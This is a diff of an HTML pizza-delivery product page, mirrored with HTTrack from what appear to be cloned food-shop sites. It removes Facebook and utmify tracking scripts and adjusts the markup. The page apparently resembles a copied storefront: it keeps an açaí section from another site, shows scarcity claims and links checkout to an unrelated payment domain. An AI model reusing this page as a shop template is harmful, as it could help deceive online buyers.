@@ -108,30 +108,9 @@
         <script src="../npm/sweetalert2%4011.js"></script>
         <link rel="stylesheet" href="../icone91f.css?family=Material+Icons">
     
-    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
-    <!-- Meta Pixel Code -->
-    <script>
-        !function(f,b,e,v,n,t,s)
-        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-        n.queue=[];t=b.createElement(e);t.async=!0;
-        t.src=v;s=b.getElementsByTagName(e)[0];
-        s.parentNode.insertBefore(t,s)}(window, document,'script',
-        '../../../connect.facebook.net/en_US/fbevents.js');
-        fbq('init', '2095811594270440');
-        fbq('track', 'PageView');
-        </script>
-        <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2095811594270440&amp;ev=PageView&amp;noscript=1"></noscript>
-        <!-- End Meta Pixel Code -->
-        <script>
-      window.pixelId = "67d63411e616101fde8a59db";
-      var a = document.createElement("script");
-      a.setAttribute("async", "");
-      a.setAttribute("defer", "");
-      a.setAttribute("src", "../../../cdn.utmify.com.br/scripts/pixel/pixel.js");
-      document.head.appendChild(a);
-    </script>
+    
+    
+        
     </head>
     
     <body>
@@ -179,12 +158,12 @@
                             const statusLoja = document.getElementById("status-loja");
                             const iconeRelogio = document.getElementById("icone-relogio");
                             const horarioFechamento = document.getElementById("horario-fechamento");
-                            if (horas >= 0 && horas < 2) {
+                            if (horas>= 0 && horas < 2) {
                                 statusLoja.textContent = "Aberto para pedidos no site!";
                                 horarioFechamento.textContent = "at&eacute; 02:00";
                                 iconeRelogio.style.display = "inline";
                                 horarioFechamento.style.display = "inline";
-                            } else if (horas >= 8 && horas < 23) {
+                            } else if (horas>= 8 && horas < 23) {
                                 statusLoja.textContent = "Aberto para pedidos no site!";
                                 iconeRelogio.style.display = "none";
                                 horarioFechamento.style.display = "none";
@@ -211,11 +190,8 @@
                             </figure>
                         </div>
                         <div class="descricao">
-                            <h3>Pizza strogonoff de carne</h3>
-                            <span class="detalhe">1 Pizza grande 35cm (8 pedaços)</span><br>
-                            de <span class="precoPromocao">R$ 49,80</span> por
-                            <span class="preco">
-                                R$ 32,90<span style="display:none;">32.90</span>
+                            <div class="title-container"><h3>Pizza strogonoff de carne</h3>
+                            <span class="detalhe">1 Pizza grande 35cm (8 pedaços)</span></div><div class="price-container">de <span class="precoPromocao">R$ 49,80</span> por apenas <span class="preco">R$ 32,90<span style="display:none;">32.90</span></div>
                             </span>
                             <span class="estoque"><i class="fa-solid fa-circle-down"></i> apenas 26 Pizzas disponíveis</span>
                             <span></span>
@@ -226,9 +202,9 @@
                             data-maximo="1" data-opcional="n">
                             <div class="topo">
                                 <div>
-                                    <h3>Escolha Seu Sabor:</h3>
+                                    <div class="title-container"><h3>Escolha Seu Sabor:</h3>
                                     <span class="detalhe">
-                                        Escolha 1 opção </span>
+                                        Escolha 1 opção </span></div>
                                 </div>
                                 <div class="col2">
                                     <span class="escolhidos"><span>0</span>/1</span>
@@ -283,9 +259,9 @@
                         <div id="complementos-gratis" class="tipo" data-id="15313" data-calculo="n" data-minimo="0" data-maximo="1" data-opcional="n">
                             <div class="topo">
                                 <div>
-                                    <h3>Bordas:</h3>
+                                    <div class="title-container"><h3>Bordas:</h3>
                                     <span class="detalhe">
-                                        Escolha 1 opção </span>
+                                        Escolha 1 opção </span></div>
                                 </div>
                                 <div class="col2">
                                     <span class="escolhidos"><span>0</span>/1</span>
@@ -369,9 +345,9 @@
                             data-maximo="0" data-opcional="n">
                             <div class="topo">
                                 <div>
-                                    <h3>Turbine Seu Açaí:</h3>
+                                    <div class="title-container"><h3>Turbine Seu Açaí:</h3>
                                     <span class="detalhe">
-                                    </span>
+                                    </span></div>
                                 </div>
                                 <div class="col2">
                                     <i class="fa-solid fa-circle-check" style="display: inline"></i>
@@ -539,9 +515,9 @@
                             <input class="qtde" type="text" value="1" min="1" max="86" size="3" disabled="">
                             <button class="adicionarQtde" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
                         </div>
-                        <div id="precoProduto">R$ 0,00</div>
+                        <div id="precoProduto">Valor total: R$ 0,00</div>
                         <span class="precoProduto" style="display:none">14.00</span>
-                        <button class="btn adicionarProduto" onclick="finalizar()">FINALIZAR PEDIDO</button><a href="https://pay.brasilpagamentos.space/lqv13089qMr3xbj" id="finalizarPedido" style="display: none;"></a>
+                        <button class="btn adicionarProduto">FINALIZAR PEDIDO</button><a href="https://pay.brasilpagamentos.space/lqv13089qMr3xbj" id="finalizarPedido" style="display: none;"></a>
                     </div>
                 </div>
             </div>
@@ -552,7 +528,7 @@
         <script src="js/all.js" data-auto-replace-svg="nest" defer="" type="text/javascript"></script>
         <script type="text/javascript" src="js/jquery-mask.js" defer=""></script>
     
-        <script src="js/sweetalert.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        <script src="js/sweetalert.min.js"></script>
     
         <script>
             function finalizar() {
@@ -593,4 +569,5 @@
     </body><!-- Mirrored from megaacaidelivery.netlify.app/produtos/acai/pague-1-leve-2-500ml by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 11 Feb 2025 21:59:10 GMT -->
 <!-- Mirrored from pizzariamilano.fun/n1/produtos/strogonoffdecarne.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 20 Apr 2025 23:25:11 GMT -->
 </html>
+
 
